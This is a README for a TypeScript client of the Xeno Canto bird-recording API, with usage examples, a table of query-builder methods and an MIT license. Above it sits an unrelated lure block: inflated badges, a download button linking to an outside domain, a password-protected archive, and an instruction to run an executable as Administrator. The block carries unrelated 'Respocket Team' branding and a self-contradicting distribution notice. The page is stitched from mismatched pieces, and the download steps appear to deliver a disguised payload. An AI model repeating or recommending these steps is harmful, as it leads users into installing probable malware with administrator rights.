<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Installation

```bash
npm install xeno-canto-api
```

## Usage

```typescript
import { XenoCanto, XenoCantoRequestBuilder } from "xeno-canto-api";

const xc = new XenoCanto("your-api-key");

const result = await xc.search(
    new XenoCantoRequestBuilder()
        .withGenus("troglodytes")
        .withSpecies("troglodytes")
        .withCountry("spain")
        .withType("song")
        .withQuality("A")
        .withPerPage(50)
);

console.log(result.numRecordings, "recordings found");
result.recordings.forEach(rec => {
    console.log(rec.en, rec.cnt, rec.date, rec.file);
});
```

## API

### `XenoCanto`

```typescript
const xc = new XenoCanto(APIKey: string);
xc.search(builder: QueryBuilder): Promise<RecordingsResponse>
```

### `XenoCantoRequestBuilder`

Fluent builder for constructing Xeno Canto API v3 queries. All methods return `this` for chaining.

#### Taxonomic

| Method | Tag | Example |
|---|---|---|
| `withSpecies(value)` | `sp:` | `withSpecies("troglodytes")` |
| `withGenus(value)` | `gen:` | `withGenus("larus")` |
| `withSubspecies(value)` | `ssp:` | `withSubspecies("fuscus")` |
| `withFamily(value)` | `fam:` | `withFamily("laridae")` |
| `withEnglishName(value)` | `en:` | `withEnglishName("eurasian wren")` |
| `withGroup(value)` | `grp:` | `withGroup("birds")` |

Groups: `"birds"`, `"grasshoppers"`, `"bats"`, `"frogs"`, `"land mammals"`, `"soundscape"`

#### Geographic

| Method | Tag | Example |
|---|---|---|
| `withCountry(value)` | `cnt:` | `withCountry("france")` |
| `withLocation(value)` | `loc:` | `withLocation("Suffolk, England")` |
| `withLatitude(value)` | `lat:` | `withLatitude(">66.5")` |
| `withLongitude(value)` | `lon:` | `withLongitude(4.2884)` |
| `withArea(value)` | `area:` | `withArea("europe")` |
| `withBoundingBox(latMin, lonMin, latMax, lonMax)` | `box:` | `withBoundingBox(-1.16, 94.62, 6.34, 106.48)` |

Areas: `"africa"`, `"america"`, `"asia"`, `"australia"`, `"europe"`, `"antarctica"`

#### Date

| Method | Tag | Example |
|---|---|---|
| `withYear(value)` | `year:` | `withYear("<1970")` |
| `withMonth(value)` | `month:` | `withMonth(">8")` |
| `withUploadedSince(days)` | `since:` | `withUploadedSince(31)` |

#### Sound and animal

| Method | Tag | Example |
|---|---|---|
| `withType(value)` | `type:` | `withType("song")`, `withType("social call")` |
| `withSex(value)` | `sex:` | `withSex("female")` |
| `withStage(value)` | `stage:` | `withStage("juvenile")` |
| `withRecordist(value)` | `rec:` | `withRecordist("John Smith")` |
| `withBackgroundSpecies(value)` | `also:` | `withBackgroundSpecies("Parus major")` |

#### Sound file

| Method | Tag | Example |
|---|---|---|
| `withQuality(value)` | `q:` | `withQuality("A")` |
| `withLength(value)` | `len:` | `withLength(">3600")` |
| `withSampleRate(value)` | `smp:` | `withSampleRate(">192000")` |

#### Pagination

```typescript
.withPage(2)        // default: 1
.withPerPage(50)    // default: 100, range: 50–500
```

## License

MIT


---

MIT License

Copyright (c) 2026 Joshua Zillwood

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
